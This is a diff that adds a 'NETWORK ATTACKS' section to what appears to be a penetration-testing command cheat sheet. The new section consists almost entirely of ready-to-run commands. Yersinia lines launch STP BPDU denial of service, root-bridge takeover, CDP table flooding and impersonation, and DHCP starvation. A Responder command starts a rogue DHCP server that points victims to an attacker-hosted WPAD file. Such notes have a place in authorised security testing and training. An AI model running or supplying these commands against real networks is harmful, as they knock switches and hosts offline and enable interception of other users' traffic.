@@ -156,6 +156,37 @@ tcpdump -tttt
 tcpdump -n
 
 
+# ===============
+# NETWORK ATTACKS
+# ===============
+
+# STP BPDU DoS
+yersinia stp -attack 2 # Yersinia is a network tool primarily used for network exploitation and security auditing
+yersinia stp -attack 3
+
+# STP TCN Attack
+yersinia stp -attack 1 #Will send 1 TCN packet and the switch should restore the CAM in 15 seconds
+yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
+
+# STP Root Attack
+yersinia stp -attack 4 # Behaves like the root switch
+yersinia stp -attack 5 # This will make the device behaves as a switch but will not be root
+
+# Cisco Discover Protocol (CDP) Table Flooding
+sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
+
+# CDP Impersonation Attack
+sudo yersinia cdp -attack 2 #Simulate a new CISCO device
+sudo yersinia cdp -attack 0 #Send a CDP packet
+
+# DHCP DoS 
+yersinia dhcp -attack 1 # Flood with DHCP Discover packets
+yersinia dhcp -attack 3 
+
+# Example to start a rogue DHCP server with specified options
+!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
+
+# 
 
 
 
